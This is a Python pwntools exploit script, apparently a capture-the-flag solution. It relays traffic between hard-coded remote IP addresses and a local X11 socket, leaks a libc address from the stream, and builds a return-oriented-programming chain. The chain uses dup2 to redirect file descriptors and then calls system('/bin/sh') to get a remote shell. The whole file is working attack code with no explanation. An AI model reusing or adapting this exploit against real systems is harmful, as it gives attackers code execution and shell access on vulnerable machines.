from pwn import *

context.log_level = 'debug'

def sender(src, dst, num):
    leak_prefix = b'plusls'.ljust(0xa+8, b'a')
    while True:
        data = src.recv(4096)
        if len(data) == 0:
            break
        log.info(hexdump(data))
        if num == 0 and leak_prefix in data:
            libc_ptr = data[data.find(leak_prefix) + len(leak_prefix): data.find(leak_prefix) + len(leak_prefix) + 6]
            log.success('libc_addr: {:#x}'.format(u64(libc_ptr + b'\x00\x00')))
        dst.send(data)

def gen(data):
    f = open('exp', 'wb')
    f.write(data)
    f.close()

def main():
    #l = remote('127.0.0.1', 11451)
    # l = remote('43.155.75.143', 9001)
    l = remote('175.27.160.156', 9001)
    #r = remote('wsl-host', 6004)
    r = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    r.connect("/tmp/.X11-unix/X0")
    
    t1 = threading.Thread(target=sender, args=(l, r, 0))
    t2 = threading.Thread(target=sender, args=(r, l, 1))
    t1.start()
    t2.start()

    gen(b'plusls'.ljust(0xa + 0x8, b'a'))
    log.info("gen leak exp success.")
    libc_ptr = int(input('libc_ptr: '), 16)
    if libc_ptr & 0xfff == 0xe4a:
        libc_base = libc_ptr - 0x27e4a
        payload = b'1919810'.ljust(0xa + 0x8, b'a')
        payload += p64(0x0401B0B) + p64(3) # rdi
        payload += p64(0x401B09) + p64(0) + p64(0) # rsi
        payload += p64(libc_base + 0x0EF1A0) # dup2
        payload += p64(0x0401B0B) + p64(3) # rdi
        payload += p64(0x401B09) + p64(1) + p64(0) # rsi
        payload += p64(libc_base + 0x0EF1A0) # dup2
        payload += p64(0x0401B0B) + p64(libc_base + 0x18969B) # rdi binsh
        payload += p64(libc_base + 0x76210) # puts
        payload += p64(0x0401B0B) + p64(libc_base + 0x18969B) # rdi binsh
        payload += p64(libc_base + 0x49E10) # system
        payload = payload.decode('latin').encode('utf-8')
    gen(payload)
    log.info("gen getshell success.")
    input()
    l.interactive()
    #t1.join()
    #t2.join()

if __name__ == '__main__':
    main()